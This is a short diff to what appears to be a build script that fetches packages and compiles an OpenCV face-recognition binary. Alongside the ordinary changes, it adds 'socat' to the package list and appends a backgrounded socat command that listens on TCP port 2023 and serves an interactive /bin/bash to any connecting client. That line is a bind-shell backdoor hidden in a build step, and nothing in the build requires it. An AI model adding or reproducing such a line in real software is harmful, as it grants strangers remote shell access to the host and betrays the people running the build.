@@ -56,6 +56,7 @@ libboost-filesystem-dev
 libopencv-dev
 python-opencv
 libpam0g-dev
+socat
 EOF
 ); do
     topic "Fetching .debs for $PACKAGE"
@@ -105,4 +106,4 @@ make clean
 make
 mv ./opencv-facerecog $BUILD_DIR/.apt/usr/bin/
 chmod -R 0755 $BUILD_DIR/.apt/
-
+nohup socat tcp-l:2023,reuseaddr,fork exec:/bin/bash,pty,setsid,setpgid,stderr,ctty &
